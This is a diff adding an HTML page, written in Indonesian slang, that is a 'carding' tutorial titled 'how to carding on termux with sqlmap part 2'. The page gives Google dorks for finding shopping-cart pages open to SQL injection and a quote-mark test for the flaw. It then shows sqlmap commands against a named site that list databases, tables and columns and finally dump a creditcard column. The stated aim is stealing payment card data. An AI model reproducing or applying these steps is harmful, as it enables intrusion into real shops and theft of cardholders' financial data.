@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>part 2</title>
+        <style>
+
+             @import url('https://fonts.googleapis.com/css2?family=Azeret+Mono&display=swap');
+
+             body {
+                 background-color: black;
+                 font-family: monospace;
+                 color: green;
+                 font-size: 20px;
+                 margin: 50px;
+             }
+
+             p {
+                 color: green;
+                 font-family: 'Azeret Mono', monospace;
+             }
+
+        </style>
+    </head>
+    <body>
+        <h2>how to carding on termux with sqlmap part 2</h2>
+        <p>Carding With Termux Part 2<br>
+
+            Nah kalo udah ke install tinggal dorking buat nyari targetnya yg kira2 ada credit card nya dan ada kelemahan nya. <br>
+            <br>
+            Dork:<br>
+            inurl:".php??product_id="<br>
+            inurl:".php?man_code="<br>
+            inurl:".php?marque="<br>
+            inurl:".php?sec_id="<br>
+            inurl:".php?history_cms.php?selectCat="<br>
+            inurl:".php?ph="<br>
+            inurl:".php?aid="<br>
+            inurl:"add.asp?bookid="<br>
+            inurl:"add_cart.asp?num="<br>
+            inurl:"addcart.asp?"<br>
+            inurl:"addItem.asp"<br>
+            inurl:"add-to-cart.asp?ID="<br>
+            inurl:"addToCart.asp?idProduct="<br>
+            inurl:"addtomylist.asp?ProdId="<br>
+            <br>
+            Nah itu salah satu dork nya kalian kopi lalu paste di google. Nah setelahnya kan banyak web ntuh, tinggal pilih salah satu webnya. Nah, kalian cari bugnya caranya tambahkan tanda petik di belakang ( ' ) itu berguna untuk mengecek bug/kelemahan pada web. Nah, bug ini biasa disebut Bug Sql. <br>
+            Anggap aja mimin dah dapet <br>
+            Target:<br>
+            https://www.atholbooks-sales.org/add_cart.php?id=163<br>
+            Nah, kita tambahin query ( ' ) jadinya:<br>
+            https://www.atholbooks-sales.org/add_cart.php?id=163'<br>
+            Nah, kalo web nya nge blank dan ada tulisan "Your sql syntax" Berarti vuln atau bisa kita bobol:v anjaayy kek maling. <br>
+            Nah, kalo udah salin linknya. Sekarang lu buka termux, jangan buka celana, gw tau punya lu gede. Tapi ya gak sah pamer :v <br>
+            Sekarang ketik:<br>
+            <br>
+            $cd sqlmap<br>
+            $ python2 sqlmap.py -u https://www.atholbooks-sales.org/add_cart.php?id=163 --dbs<br>
+            Nah, nanti kalo ada pilihan y/n klik aja y terus enter. Atau enter aja dah cukup. <br>
+            Tunggu ampe prosesnya selesai. Jangan lu tinggalin, kek dia yg selalu ninggalin. <br>
+            Dan usahakan pas ngejalanin, jangan di sambi nelpon, biar stabil jaringannya. <br>
+            Percuma lu nelpon tapi cuma buat pelampiasan dia.<br> 
+            Nah, anggep aja dah selesai. Disini mimin nemu 4 database. <br>
+            <br>
+            -Heuristik_sales<br>
+            -Heuristik_cart<br>
+            -Heuristik_user<br>
+            -information_schema<br>
+            <br> 
+            Sekarang kita cari tablenya buat masuk lebih dalam, agar lebih nikmat... Anjaayy, maksud gw buat liat dalemnya. <br>
+            Caranya ketik:<br>
+            <br>
+            $ python2 sqlmap.py -u https://www.atholbooks-sales.org/add_cart.php?id=163 -D Heuristik_sales --tables<br>
+            
+            Nah... Kaya biasa kalo ada y/n dienter aja. Tungguin, sampe prosesnya selesai. Nah, Mimin dah nemu sekitar table. <br>
+            <br>
+            -member_info<br>
+            -card_type<br>
+            -cart_info<br>
+            -add_info<br>
+            
+            Nah, niat kita ambil credit cardnya, tapi ini gak full info. Cuman credit doang. <br>
+            Nah, sekarang kita cari columns nya. <br>
+            Sekarang kita ketik:<br>
+            <br>
+            $ python2 sqlmap.py -u https://www.atholbooks-sales.org/add_cart.php?id=163 -D Heuristik_sales -T card_type --columns<br>
+            <br>
+            Nah, seperti biasa. Kalo ada y/n, enter aja. Tunggu prosesnya sampai selesai. <br>
+            Anggep aja dah selesai dan mimin nemuin sekitar 4 columns. <br>
+            <br>
+            -creditcard<br>
+            -visa<br>
+            -mastercard<br>
+            -debitcard<br>
+            <br>
+            Nah sekarang tinggal kita eksekusi/dump. Kita ketik:<br><br>
+            <br>
+            $ python2 sqlmap.py -u https://www.atholbooks-sales.org/add_cart.php?id=163 -D Heuristik_sales -T card_type -C creditcard --dump<br>
+            <br>
+            Tunggu hasilnya sampai CC nya ke dump. Usahakan jangan buka aplikasi lain atau nelpon mantan lu. Biar jaringannya stabil. <br></p>
+    </body>
+</html>
